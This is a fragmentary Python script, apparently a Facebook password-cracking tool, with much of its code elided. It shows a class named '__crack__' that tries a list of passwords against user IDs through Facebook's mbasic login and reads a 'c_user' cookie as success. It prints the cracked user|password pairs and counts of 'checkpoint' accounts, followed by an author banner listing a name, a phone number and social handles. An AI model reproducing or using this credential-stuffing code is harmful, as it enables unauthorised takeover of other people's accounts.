...
def main_apv():
 ...
 \o/ v\  /v \o/      \o/       \o/  \o/  \o/     o__ __o/  \o__ __o   
...
def R():
			...
			if key in [""]:
				...
				os.system('xdg-open https://wa.me/+9234355739976')
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;32m[ M-ULLAH😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;32m[M-ULLAH-SUCCESSFUL] %s | %s      ' % (user,pw))
				...
				print('\r\033[1;91m[M-ULLAH-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
\033[1;94m ⇨AUTHOR    : MUHAMMAD ULLAH

\033[1;95m ⇨WHATSAPP  : +923435573976

\033[1;96m ⇨FACEBOOK  : MUHAMMAD ULLAH  (PUKHTOON)

\033[1;93m ⇨INSTA     : m.ullah49

\033[1;91m ⇨VERSION   : 0.1 UPDATE ON 02 March
